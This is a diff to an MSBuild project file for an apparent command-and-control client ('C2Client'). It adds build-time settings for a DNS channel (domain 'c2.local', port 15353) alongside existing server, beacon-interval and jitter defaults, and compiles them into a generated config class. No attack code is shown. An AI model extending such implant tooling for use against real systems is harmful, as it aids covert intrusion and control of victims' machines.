@@ -16,6 +16,9 @@
     <C2Server Condition="'$(C2Server)' == ''">127.0.0.1:8000</C2Server>
     <C2Interval Condition="'$(C2Interval)' == ''">10</C2Interval>
     <C2Jitter Condition="'$(C2Jitter)' == ''">0.3</C2Jitter>
+    <C2Channel Condition="'$(C2Channel)' == ''">http</C2Channel>
+    <C2DnsDomain Condition="'$(C2DnsDomain)' == ''">c2.local</C2DnsDomain>
+    <C2DnsPort Condition="'$(C2DnsPort)' == ''">15353</C2DnsPort>
     <DefineConstants>$(DefineConstants);C2_SERVER_BUILTIN</DefineConstants>
   </PropertyGroup>
 
@@ -29,7 +32,7 @@
     <WriteLinesToFile
       File="$(IntermediateOutputPath)BuildConfig.g.cs"
       Overwrite="true"
-      Lines="namespace C2Client { static partial class BuildConfig { public const string Server = &quot;$(C2Server)&quot;%3B public const int Interval = $(C2Interval)%3B public const double Jitter = $(C2Jitter)%3B } }" />
+      Lines="namespace C2Client { static partial class BuildConfig { public const string Server = &quot;$(C2Server)&quot;%3B public const int Interval = $(C2Interval)%3B public const double Jitter = $(C2Jitter)%3B public const string Channel = &quot;$(C2Channel)&quot;%3B public const string DnsDomain = &quot;$(C2DnsDomain)&quot;%3B public const int DnsPort = $(C2DnsPort)%3B } }" />
     <ItemGroup>
       <Compile Include="$(IntermediateOutputPath)BuildConfig.g.cs" />
     </ItemGroup>
